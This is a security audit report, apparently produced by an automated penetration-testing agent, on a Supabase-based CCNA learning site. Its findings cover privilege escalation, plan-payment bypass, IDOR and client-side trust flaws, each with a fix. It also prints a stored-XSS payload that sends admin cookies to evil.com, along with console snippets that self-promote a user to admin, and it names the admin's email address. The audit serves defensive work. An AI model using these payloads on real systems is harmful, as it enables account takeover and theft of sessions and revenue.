# Regular User Security Testing — CCNA_Lessons

**Audit Date:** 2026-08-05
**Source Code:** /Users/andreastsiartas/Documents/CCNA_Lessons
**Tester:** Automated Penetration Testing Agent

---

## Findings Summary

| Severity | Count | Key Issues |
|----------|-------|------------|
| CRITICAL | 2 | Privilege escalation (admin self-promotion, plan bypass) |
| HIGH | 3 | Stored XSS in admin, real-time IDOR, incomplete sign-out |
| MEDIUM | 4 | Quiz score tampering, lesson progress faking, API key exposure, admin page info leak |
| LOW | 3 | Hardcoded admin email, .env exposure, quiz answers in bundle |

---

### [CRITICAL] Privilege Escalation via Profile UPDATE — Users Can Self-Promote to Admin

**OWASP Category:** A01 - Broken Access Control
**File(s):**
- `supabase/migrations/001_initial_schema.sql` (lines 72-74)
- `supabase/migrations/005_admin_validation_db.sql` (lines 30-34)
- `src/lib/auth.ts` (lines 82-95)

**Test Performed:** Checked whether the RLS UPDATE policy on the `profiles` table restricts which columns a user can modify.

**Evidence:** The RLS policy for user profile updates is:
```sql
CREATE POLICY "Users can update own profile"
  ON profiles FOR UPDATE
  USING (auth.uid() = id);
```

This policy has a USING clause but no WITH CHECK clause that restricts column values. The `updateProfile` function in auth.ts accepts `Partial<Profile>` and passes it directly to `.update()`:
```typescript
export async function updateProfile(updates: Partial<Profile>) {
  const { data, error } = await supabase
    .from('profiles')
    .update(updates)
    .eq('id', session.user.id)
    .select()
    .single();
```

**Attack Scenario:** A regular authenticated user can call from the browser console:
```javascript
const { data: { session } } = await supabase.auth.getSession();
await supabase.from('profiles').update({ is_admin: true }).eq('id', session.user.id);
```

The RLS policy permits this because `auth.uid() = id` is satisfied. The `is_admin` column has no column-level restriction.

**Impact:** Any authenticated user can make themselves an admin, gaining full access to all user data, the ability to delete any account, and access to the admin dashboard.

**Remediation:** Add a WITH CHECK clause that prevents non-admin users from setting `is_admin`:
```sql
CREATE POLICY "Users can update own profile"
  ON profiles FOR UPDATE
  USING (auth.uid() = id)
  WITH CHECK (
    auth.uid() = id
    AND (is_admin = FALSE OR is_admin IS NULL)
  );
```
Alternatively, remove the `is_admin` column from the client-side Profile type and only allow admin updates through a server-side RPC.

---

### [CRITICAL] Privilege Escalation — Users Can Self-Upgrade to Pro Plan Without Payment

**OWASP Category:** A01 - Broken Access Control
**File(s):**
- `supabase/migrations/001_initial_schema.sql` (lines 10, 72-74)
- `src/lib/auth.ts` (lines 82-95)
- `src/pages/en/pricing.astro` (lines 187-232)

**Test Performed:** Checked whether a user can bypass the Revolut payment flow by directly updating their plan.

**Evidence:** The `profiles` table has a CHECK constraint `plan IN ('free', 'pro')` but no RLS restriction on which plan values a user can set. The same UPDATE policy `USING (auth.uid() = id)` applies.

**Attack Scenario:** A regular authenticated user can call:
```javascript
await supabase.from('profiles').update({ plan: 'pro' }).eq('id', session.user.id);
```

This bypasses the entire Revolut payment flow. The user gains Pro access without paying.

**Impact:** Complete revenue bypass. All Pro features become available without payment. Direct financial loss.

**Remediation:** Either:
1. Add a WITH CHECK clause preventing users from setting `plan` on their own profile
2. Use a server-side RPC for all plan changes
3. Remove the `plan` column from the client-accessible Profile type

---

### [HIGH] Stored XSS via Display Name in Admin Dashboard (innerHTML)

**OWASP Category:** A03 - Injection (Cross-Site Scripting)
**File(s):**
- `src/pages/en/admin.astro` (lines 489-514, 647-659, 795)
- `src/pages/el/admin.astro` (line 231)

**Test Performed:** Checked whether user-controlled data (display_name) is safely rendered when inserted into innerHTML.

**Evidence:** In admin.astro, the users table is built using innerHTML with unsanitized user data:
```javascript
tableBody.innerHTML = profiles.map(p => {
  return `<tr ...>
    <td>${p.display_name || 'User'}</td>      // XSS HERE
    <td>${userEmail}</td>                       // XSS HERE
    <button data-user-name="${p.display_name || 'User'}" ...>
  </tr>`;
}).join('');
```

**Attack Scenario:** A user sets their display_name to:
```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```
When an admin visits the admin dashboard, the script executes in the admin's browser context, potentially stealing their session.

**Impact:** Session hijacking of admin accounts. An attacker could steal the admin's Supabase session token, gaining full admin access.

**Remediation:** Use `textContent` instead of innerHTML for user-controlled data, or implement an HTML escaping function.

---

### [HIGH] Real-time Subscription IDOR via localStorage userId

**OWASP Category:** A01 - Broken Access Control (Insecure Direct Object Reference)
**File(s):**
- `src/pages/en/dashboard.astro` (lines 533-574)
- `src/components/layout/Header.tsx` (lines 59-60)

**Test Performed:** Checked whether real-time subscriptions use client-controlled or server-validated user IDs.

**Evidence:** In dashboard.astro, the userId for real-time subscriptions is read from localStorage:
```javascript
const userId = localStorage.getItem('userId');
if (userId) {
  supabase
    .channel('lesson-progress-changes')
    .on('postgres_changes', {
      event: '*',
      schema: 'public',
      table: 'lesson_progress',
      filter: `user_id=eq.${userId}`,
    }, () => { loadDashboard(); })
    .subscribe();
```

**Attack Scenario:** A user modifies their localStorage:
```javascript
localStorage.setItem('userId', '<target-user-uuid>');
location.reload();
```

The real-time subscription now listens to another user's data changes. The attacker would receive live notifications of when the target user completes lessons, takes quizzes, or earns points.

**Impact:** Information disclosure of another user's activity patterns in real-time.

**Remediation:** Use the Supabase auth session to derive the userId server-side rather than reading from localStorage.

---

### [HIGH] Incomplete Sign-Out — Sensitive Data Remains in localStorage

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):**
- `src/components/layout/Header.tsx` (lines 280-284, 343-347)
- `src/pages/en/profile.astro` (lines 441-445)

**Test Performed:** Checked whether all sensitive localStorage keys are cleared on sign-out.

**Evidence:** The sign-out handlers only remove two keys:
```javascript
await supabase.auth.signOut();
localStorage.removeItem('userEmail');
localStorage.removeItem('userId');
```

The following keys are NOT cleared on sign-out:
- `adminSettings` (contains site configuration and API keys)
- `userAvatar` (base64 encoded profile image)
- `completedLessons_<userId>` (learning progress)
- `moduleFeedback` (contains userId and userName)

**Impact:** If a shared computer is used, the next user could see the previous user's avatar, learning progress, and admin settings.

**Remediation:** Clear all user-specific keys on sign-out.

---

### [MEDIUM] Client-Side Quiz Score Calculation Allows Score Tampering

**OWASP Category:** A04 - Insecure Design
**File(s):**
- `src/components/quiz/QuizEngine.tsx` (lines 69-85, 87-143)
- `src/lib/auth.ts` (lines 128-169)

**Test Performed:** Checked whether quiz scores are validated server-side.

**Evidence:** The quiz score is calculated entirely on the client:
```typescript
const calculateScore = useCallback(() => {
  let correct = 0;
  questions.forEach((q, idx) => {
    if (selectedAnswers[idx] === q.correct) {
      correct++;
    }
  });
  const percentage = Math.round((correct / questions.length) * 100);
  return { correct, total: questions.length, percentage, ... };
}, [questions, selectedAnswers]);
```

This is then sent directly to the database without server-side verification.

**Attack Scenario:** A user can intercept the Supabase request and modify `score: 100` and `correct_answers: 15` regardless of actual answers.

**Impact:** Users can artificially inflate quiz scores to earn certificates without actually completing the material.

**Remediation:** Move score calculation to a server-side function. The client should submit selected answers, not the score.

---

### [MEDIUM] Client-Side Lesson Progress Can Be Faked via localStorage

**OWASP Category:** A04 - Insecure Design
**File(s):**
- `src/pages/en/lessons/[module]/[lesson].astro` (lines 359-368, 386-393)
- `src/pages/en/dashboard.astro` (lines 281-282, 310-323)

**Test Performed:** Checked whether lesson completion status relies on client-side state.

**Evidence:** The dashboard takes `Math.max(supabase, local)` for progress:
```javascript
const supabaseCompleted = moduleProgress.filter(p => p.status === 'completed').length;
let localCount = 0;
for (let l = 1; l <= moduleLessons[m - 1]; l++) {
  if (localCompletedMap[`${m}_${l}`]) localCount++;
}
const completed = Math.max(supabaseCompleted, localCount);
```

**Attack Scenario:** A user can mark all lessons as completed in localStorage without ever visiting the actual lesson pages.

**Impact:** Users can fake lesson completion to appear more advanced than they actually are.

**Remediation:** The dashboard should only use Supabase data for official progress tracking.

---

### [MEDIUM] Revolut API Key Stored in Client-Side localStorage

**OWASP Category:** A02 - Cryptographic Failures
**File(s):**
- `src/pages/en/pricing.astro` (lines 198-200, 209-212)
- `src/lib/admin.ts` (lines 8-28, 51-68)

**Test Performed:** Checked whether sensitive API keys are exposed to the client.

**Evidence:** The pricing page reads the Revolut API key from localStorage and uses it directly in a browser fetch call:
```javascript
const settings = JSON.parse(localStorage.getItem('adminSettings') || '{}');
const revolutApiKey = settings.revolutApiKey;
const response = await fetch('https://merchant.revolut.com/api/1.0/orders', {
  headers: { 'Authorization': `Bearer ${revolutApiKey}` },
});
```

**Impact:** Revolut API key compromise could allow unauthorized payment operations.

**Remediation:** Never handle payment API keys client-side. All Revolut API calls should go through a server-side edge function.

---

### [MEDIUM] Admin Dashboard Access Control is Client-Side Only

**OWASP Category:** A01 - Broken Access Control
**File(s):** `src/pages/en/admin.astro` (lines 395-418)

**Test Performed:** Checked whether admin page access is enforced server-side.

**Evidence:** The admin page hides content using CSS classes based on a client-side database query. While RLS protects the data, the admin page HTML leaks the admin email address and reveals the admin interface structure.

**Impact:** Information disclosure of admin email and interface structure.

**Remediation:** Consider server-side rendering that returns a 403 response for non-admin users.

---

### [LOW] Hardcoded Admin Email Exposed in Multiple Client-Side Files

**OWASP Category:** A05 - Security Misconfiguration
**File(s):**
- `src/lib/admin.ts` (line 2)
- `src/pages/en/admin.astro` (line 38)
- `src/pages/en/login.astro` (line 142)
- Multiple SQL migrations

**Evidence:** The admin email `tsiartasantreas@gmail.com` appears in 4+ client-side locations.

**Impact:** Targeted phishing. An attacker knows the exact admin email.

**Remediation:** Remove hardcoded email from client-side code. Use the `profiles.is_admin` boolean column exclusively.

---

### [LOW] .env File Contains Supabase Anon Key

**OWASP Category:** A05 - Security Misconfiguration
**File(s):** `.env` (lines 1-3)

**Evidence:** The `.env` file contains the Supabase project URL and anon key. While the anon key is designed to be public, exposing it in a tracked file is unnecessary.

**Remediation:** Ensure `.env` is in `.gitignore`.

---

### [LOW] Quiz Questions and Correct Answers Exposed in Client Bundle

**OWASP Category:** A04 - Insecure Design
**File(s):**
- `src/lib/quiz-questions.ts`
- `src/components/quiz/QuizEngine.tsx` (line 9)

**Evidence:** The QuizQuestion interface includes `correct: number` which is the index of the correct answer. The quiz questions (including correct answers) are passed to the QuizEngine component, which runs entirely in the browser.

**Impact:** Users can inspect the JavaScript bundle to find all correct answers before taking quizzes.

**Remediation:** The correct answer indices should not be sent to the client. Submit answers to a server-side function for validation.

---

## Positive Findings (What is Done Right)

1. **RLS on all tables**: Row Level Security is enabled on all tables with proper `auth.uid()` checks.
2. **Server-side admin functions**: `admin_update_user_plan`, `admin_get_stats`, and `delete_user_account` properly validate admin status.
3. **increment_points RPC auth check**: Migration 004 added `IF auth.uid() != p_user_id THEN RAISE EXCEPTION`.
4. **Input validation on server functions**: `save_quiz_score` validates score range (0-100), module number (1-6).
5. **Admin check queries database, not client**: The admin.astro page queries `profiles.is_admin` from the database.
6. **User-specific localStorage keys**: Learning progress keys include the userId.
